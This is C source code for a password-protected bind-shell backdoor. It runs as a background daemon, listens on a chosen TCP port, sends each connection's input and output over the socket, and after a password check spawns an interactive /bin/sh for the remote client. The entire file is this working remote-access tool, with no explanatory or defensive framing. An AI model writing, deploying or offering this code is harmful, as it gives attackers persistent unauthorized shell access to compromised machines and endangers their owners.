#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <stdlib.h>
int main(int argc, char **argv) {
    int s,c,i;
    char p[30];
    struct sockaddr_in r;
    daemon(1,0);
    s = socket(AF_INET,SOCK_STREAM,0);
    if(!s) return -1;
    r.sin_family = AF_INET;
    r.sin_port = htons(atoi(argv[1]));
    r.sin_addr.s_addr = htonl(INADDR_ANY);
    bind(s, (struct sockaddr *)&r, 0x10);
    listen(s, 5);
    while(1) {
        c=accept(s,0,0);
        dup2(c,0);
        dup2(c,1);
        dup2(c,2);
        write(c,"Password:",9);
        read(c,p,sizeof(p));
        for(i=0;i<strlen(p);i++)
            if( (p[i] == '\n') || (p[i] == '\r') )
                p[i] = '\0';
        if (strcmp(argv[2],p) == 0)
            system("/bin/sh -i");
        close(c);
    }
}
